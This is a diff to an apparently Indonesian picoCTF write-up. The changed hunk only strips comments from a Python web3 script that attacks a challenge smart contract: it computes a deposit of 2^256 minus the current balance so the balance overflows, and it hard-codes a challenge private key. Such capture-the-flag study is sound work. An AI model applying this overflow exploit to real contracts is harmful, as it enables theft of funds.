@@ -86,13 +86,11 @@ Tujuannya dalah membuat balances[msg.sender] < amount bernilai true. sehingga un
 
 from web3 import Web3
 
-# Konfigurasi
 rpc_url = "http://mysterious-sea.picoctf.net:59295"
 contract_address = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
 private_key = "0x5990268c3d92cabbac6c3097e17eecf36895ad7f19367acb74988d8799c3d08f"
 my_address = "0x3043412EfA52B7fC4d7A804AB24dD22d2e9c8cd2"
 
-# ABI sederhana untuk berinteraksi dengan fungsi yang dibutuhkan
 abi = [
     {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
     {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},
@@ -103,8 +101,6 @@ w3 = Web3(Web3.HTTPProvider(rpc_url))
 contract = w3.eth.contract(address=contract_address, abi=abi)
 
 current_balance = contract.functions.balances(my_address).call()
-# Nilai untuk memicu overflow (2^256)
-# Kita deposit sejumlah besar agar saldo + amount melebihi 2^256 - 1
 overflow_amount = (2**256) - current_balance
 
 print(f"Saldo saat ini: {current_balance}")
